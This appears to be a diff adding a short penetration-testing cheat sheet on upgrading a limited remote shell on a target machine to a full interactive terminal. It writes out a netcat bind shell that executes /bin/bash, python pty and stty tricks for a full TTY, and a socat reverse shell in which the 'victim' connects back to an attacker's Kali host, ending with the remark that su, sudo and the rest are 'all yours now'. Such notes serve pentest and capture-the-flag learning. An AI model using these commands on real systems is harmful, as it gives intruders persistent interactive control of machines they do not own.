@@ -1,0 +1,34 @@
+# Ways to upgrade shells from "dumb terminals"
+
+# Method 1 - Upgrade dumb shell to tty manually
+
+# target machine: Start listener and exec shell on connection
+[target ~]$ nc -l -p 8080 -e /bin/bash
+# attacker machine
+[attacker ~]$ nc -v <TARGET> 8080
+# In new nc target shell upgrade 
+[target ~]$ python -c 'import pty; pty.spawn("/bin/bash")'
+# CTRL-Z
+
+# On attacker kali - collect term info.
+$ stty -a; echo $TERM; echo $SHELL; # Remember tty rows and columns number.
+$ stty raw -echo 
+$ fg
+
+# Back on reverse shell of target, things may look strange we will fix.
+target $ reset # You probably wont see what you types just make sure you type it and hit enter
+# After reset tty should be sane again. Finish full shell upgrade
+target $ export SHELL=bash
+target $ export TERM=xterm-256color
+target $ stty row <num> columns <num>  # the numbers you collected running stty -a on your shell..
+
+# Should now have full interactive shell!
+~ full_shell $ tmux, su, sudo, vim.. It's all yours now :-)
+
+
+# Method 2 - SOCAT Reverse shell
+
+# Listener to catch reverse shell from target:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+# Victim
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:kali-ip:4444
